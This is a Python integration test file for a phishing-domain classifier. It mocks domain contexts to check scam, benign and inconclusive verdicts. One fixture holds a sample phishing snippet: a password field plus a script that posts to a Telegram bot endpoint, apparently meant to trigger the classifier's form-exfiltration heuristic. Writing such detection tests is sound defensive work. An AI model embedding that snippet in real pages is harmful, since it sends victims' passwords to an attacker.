"""Integration tests: full classification flow through Processor.classify."""

from unittest.mock import AsyncMock, MagicMock

import pytest

from src.enricher import CertInfo, DNSInfo, DomainContext, FetchResults
from src.http_client import FetchResult
from src.processor import Processor
from src.verdict import Verdict


def _make_inactive_context() -> DomainContext:
    """Return a DomainContext representing an unreachable domain (status=404)."""
    stub = FetchResult(url="http://dead.example.com", status=404, headers={}, html="", history=[], final_url="http://dead.example.com", elapsed_ms=10.0)
    return DomainContext(
        domain="dead.example.com",
        scheme_url="http://dead.example.com",
        fetches=FetchResults(primary=stub, alternative=stub),
        dns=DNSInfo(a_records=[], aaaa_records=[], mx=[], ns=[], spf=[], dmarc=[], ttl_min=None, error=None),
        cert=CertInfo(cn=None, san=[], org=None, not_before=None, not_after=None, error=None),
        registrable="example.com",
        host="dead.example.com",
    )


def _make_scam_context() -> DomainContext:
    """Return a DomainContext that triggers FormsExfilHeuristic (definitive scam)."""
    html = '<input type="password"><script>fetch("api.telegram.org/bot123/sendMessage")</script>'
    stub = FetchResult(url="http://evil.com", status=200, headers={}, html=html, history=[], final_url="http://evil.com", elapsed_ms=10.0)
    return DomainContext(
        domain="evil.com",
        scheme_url="http://evil.com",
        fetches=FetchResults(primary=stub, alternative=stub),
        dns=DNSInfo(a_records=["1.2.3.4"], aaaa_records=[], mx=[], ns=[], spf=[], dmarc=[], ttl_min=300, error=None),
        cert=CertInfo(cn=None, san=[], org=None, not_before=None, not_after=None, error=None),
        registrable="evil.com",
        host="evil.com",
    )


class TestFullClassification:
    """Integration tests calling Processor.classify with mocked build_context."""

    async def test_scam_definitive_returns_scam(self, monkeypatch):
        monkeypatch.setattr("src.processor.build_context", AsyncMock(return_value=_make_scam_context()))
        verdict = await Processor.classify("phish-testbrand.com")
        assert verdict is Verdict.SCAM

    async def test_inactive_domain_returns_benign(self, monkeypatch):
        monkeypatch.setattr("src.processor.build_context", AsyncMock(return_value=_make_inactive_context()))
        verdict = await Processor.classify("phish-testbrand.com")
        assert verdict is Verdict.BENIGN

    async def test_weak_signal_returns_inconclusive(self, monkeypatch):
        """1 of 5 weight-1 heuristics fires → score=0.2 < threshold=0.4 → INCONCLUSIVE."""
        from src.heuristics import HeuristicBase, HeuristicResults

        stub_ctx = MagicMock()
        monkeypatch.setattr("src.processor.build_context", AsyncMock(return_value=stub_ctx))

        def _make(suspicious: bool) -> MagicMock:
            h = MagicMock(spec=HeuristicBase)
            h.weight = 1
            h.evaluate.return_value = HeuristicResults(
                name="test", is_scam_definitive=False, is_benign_definitive=False,
                suspicious=suspicious, evidence=""
            )
            return h

        monkeypatch.setattr(
            "src.processor.Processor.heuristics",
            [_make(True)] + [_make(False)] * 4,
        )

        verdict = await Processor.classify("phish-testbrand.com")
        assert verdict is Verdict.INCONCLUSIVE

    async def test_parking_page_returns_benign(self, monkeypatch):
        """TEST_CONFIG has parking_signatures=['domain for sale'] → benign."""
        html = "This domain for sale. Contact the owner."
        stub = FetchResult(url="http://phish-testbrand.com", status=200, headers={}, html=html, history=[], final_url="http://phish-testbrand.com", elapsed_ms=10.0)
        ctx = DomainContext(
            domain="phish-testbrand.com",
            scheme_url="http://phish-testbrand.com",
            fetches=FetchResults(primary=stub, alternative=stub),
            dns=DNSInfo(a_records=["1.2.3.4"], aaaa_records=[], mx=[], ns=[], spf=[], dmarc=[], ttl_min=300, error=None),
            cert=CertInfo(cn=None, san=[], org=None, not_before=None, not_after=None, error=None),
            registrable="phish-testbrand.com",
            host="phish-testbrand.com",
        )
        monkeypatch.setattr("src.processor.build_context", AsyncMock(return_value=ctx))
        verdict = await Processor.classify("phish-testbrand.com")
        assert verdict is Verdict.BENIGN

    async def test_ov_cert_returns_benign(self, monkeypatch):
        """OV/EV cert (org present) → LongLivedVerifiedHeuristic → benign."""
        stub = FetchResult(url="http://phish-testbrand.com", status=200, headers={}, html="", history=[], final_url="http://phish-testbrand.com", elapsed_ms=10.0)
        ctx = DomainContext(
            domain="phish-testbrand.com",
            scheme_url="http://phish-testbrand.com",
            fetches=FetchResults(primary=stub, alternative=stub),
            dns=DNSInfo(a_records=["1.2.3.4"], aaaa_records=[], mx=[], ns=[], spf=[], dmarc=[], ttl_min=300, error=None),
            cert=CertInfo(cn="phish.com", san=[], org="Legit Corp.", not_before=None, not_after=None, error=None),
            registrable="phish-testbrand.com",
            host="phish-testbrand.com",
        )
        monkeypatch.setattr("src.processor.build_context", AsyncMock(return_value=ctx))
        verdict = await Processor.classify("phish-testbrand.com")
        assert verdict is Verdict.BENIGN
